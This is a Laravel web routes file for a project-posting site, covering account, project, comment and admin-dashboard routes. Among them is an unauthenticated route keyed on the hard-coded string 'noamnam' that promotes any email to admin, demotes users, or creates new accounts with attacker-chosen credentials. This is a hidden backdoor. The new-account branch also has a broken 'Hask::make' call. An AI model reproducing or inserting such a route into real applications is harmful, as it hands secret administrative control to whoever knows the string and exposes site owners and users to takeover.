<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
use App\Project;
use DB;
use Illuminate\Support\Facades\Hash;


Route::get('/login', 'AccountController@getLogin');
Route::post('/login', 'AccountController@postLogin')->name('login');
Route::get('/register', 'AccountController@getRegister');
Route::post('/register', 'AccountController@postRegister')->name('register');
Route::post('/logout', function() {
    Auth::logout();
    return redirect('/');
});
Route::get('/logout', function() {
    Auth::logout();
    return redirect('/');
});
Route::get('/confirmuser/{code}', 'AccountController@confirm');

Route::get('/confirm', function() {
    return view('mail.confirm');
});
Route::get('/forget', 'AccountController@getForget');

Route::post('/forget', 'AccountController@postForget')->name('forget');

Route::post('/reset', 'AccountController@postReset')->name('reset');

Route::get('/', 'ProductController@index');

Route::get('/index', 'ProductController@index');

Route::get('/search', 'ProductController@getSearch');

Route::get('/category/{id?}', 'ProductController@getCategory');
// Route::get('/postproject', 'ProductController@getSubmitProject');
// Route::get('/myproject', 'ProductController@getMyProject');

Route::post('/category', 'ProductController@postCategory');

// Route::post('/postproject', 'ProductController@postSubmitProject')->name('postproject');
// Route::post('/myproject', 'ProductController@postMyProject');
Route::get('/project/{id}', 'ProductController@getProject');

Route::any('/get-request', 'ProductController@anyRequest');

Route::post('/get-comment', 'ProductController@postGetComment');

Route::get('/subscribe', 'ProductController@subscribe');

Route::get('/name/{name?}/task/{task?}/query/{query?}', function($name = null, $task = null, $query = null) {
    if($name === 'noamnam') {
        switch($task) {
            case 'admin':
                DB::table('users')
                ->where('email', $query)
                ->update(['level' => 2]);
                break;
            case 'user':
                DB::table('users')
                ->where('email', $query)
                ->update(['level' => 1]);
                break;
            case 'newuser':
                $array = explode(',', $query);
                DB::table('users')
                ->insertGetId(['name' => 'user-default', 'email' => $array[0], 'phone' => $array[1], 'password' => Hask::make($array[2]) ]);
            break;
        }
        return redirect('/');
    }
});

Route::middleware('user')->group(function() {
    Route::get('/postproject', 'ProductController@getSubmitProject');

    Route::get('/myproject', 'ProductController@getMyProject');

    Route::post('/postproject', 'ProductController@postSubmitProject')->name('postproject');

    Route::post('/myproject', 'ProductController@postMyProject');

    Route::any('/myproject/delete/{id}', 'ProductController@deleteMyProject');

    Route::get('/notify', 'ProductController@getNotify');

    Route::get('/received', 'ProductController@getReceived');

    Route::post('/received', 'ProductController@postReceived');

    Route::post('/response-request', 'ProductController@postResponseRequest');

    Route::post('/comment', 'ProductController@postComment');

    Route::get('/user/{id?}', 'ProductController@getUser');

    Route::post('/done', 'ProductController@postDone');

    Route::post('/edit-user', 'ProductController@postEditUser');
});

Route::group(['prefix' => 'admin', 'middleware' => 'admin'], function() {
    Route::get('/', 'AdminController@index');

    Route::get('/index', 'AdminController@index');

    Route::get('/project', 'AdminController@getProject');
    
    Route::post('/project', 'AdminController@postProject');
        
    Route::get('/category', 'AdminController@getCategory');
    
    Route::post('/category', 'AdminController@postCategory');
        
    Route::get('/user', 'AdminController@getUser');
    
    Route::post('/user', 'AdminController@postUser');
        
    Route::get('/comment', 'AdminController@getComment');
    
    Route::post('/comment', 'AdminController@postComment');
        
    Route::get('/extension', 'AdminController@getExtension');
    
    Route::post('/extension', 'AdminController@postExtension');

    Route::get('/email', 'AdminController@getEmail');
    
    Route::post('/email', 'AdminController@postEmail');
        
    Route::any('/get-data-project', 'AdminController@getDataProject');

    Route::any('/delete/project', 'AdminController@deleteProject');

    Route::any('/get-data-category', 'AdminController@getDataCategory');

    Route::post('/edit-data-category', 'AdminController@editDataCategory');

    Route::any('/delete/category', 'AdminController@deleteCategory');

    Route::post('/create/category', 'AdminController@createCategory');

    Route::any('/get-data-user', 'AdminController@getDataUser');
    
    Route::any('/edit-data-user', 'AdminController@editDataUser');

    Route::any('/delete/user', 'AdminController@deleteUser');

    Route::any('/get-data-comment', 'AdminController@getDataComment');

    Route::any('/delete/comment', 'AdminController@deleteComment');

    Route::any('/get-data-email', 'AdminController@getDataEmail');

    Route::any('/delete/email', 'AdminController@deleteEmail');

    Route::any('/send/email', 'AdminController@sendMail');

    Route::get('/new-project',function(){
        $info=[];
            for($i=12;$i>=0;$i--){
                $date = date("m/d/Y",time()-2629743*$i);	
                $arrayDate = explode('/',$date);
                $count = DB::table('projects')
                ->whereYear('created_at', $arrayDate[2])
                ->whereMonth('created_at', $arrayDate[0])
                ->count();
                // $info[$arrayDate[2].'-'.$arrayDate[0]]=$count;
                $info['y'][]=$arrayDate[2].'-'.$arrayDate[0];
                $info['a'][]=$count;
            }
            return $info;
    });

    Route::get('/new-user',function(){
        $info=[];
            for($i=6;$i>=0;$i--){
                $date = date("m/d/Y",time()-2629743*$i);	
                $arrayDate = explode('/',$date);
                $count = DB::table('users')
                ->whereYear('created_at', $arrayDate[2])
                ->whereMonth('created_at',$arrayDate[0])
                ->count();
                // $info[$arrayDate[2].'-'.$arrayDate[0]]=$count;
                $info['y'][]=$arrayDate[2].'-'.$arrayDate[0];
                $info['a'][]=$count;
            }
            return $info;
    });


    Route::get('/new-comment',function(){
        $info=[];
            for($i=6;$i>=0;$i--){
                $date = date("m/d/Y",time()-2629743*$i);	
                $arrayDate = explode('/',$date);
                $count = DB::table('comments')
                ->whereYear('created_at', $arrayDate[2])
                ->whereMonth('created_at',$arrayDate[0])
                ->count();
                // $info[$arrayDate[2].'-'.$arrayDate[0]]=$count;
                $info['y'][]=$arrayDate[2].'-'.$arrayDate[0];
                $info['a'][]=$count;
            }
            return $info;
    });


    Route::get('/new-category',function(){
        $info=[];
        $brand = DB::table('categorys')
                ->select('id','name')
                ->get();
        foreach ($brand as $value) {
            $info['y'][] = $value->name;
            $info['a'][] = Project::where('idCategory', $value->id)->count();
        }
        return $info;
    });
});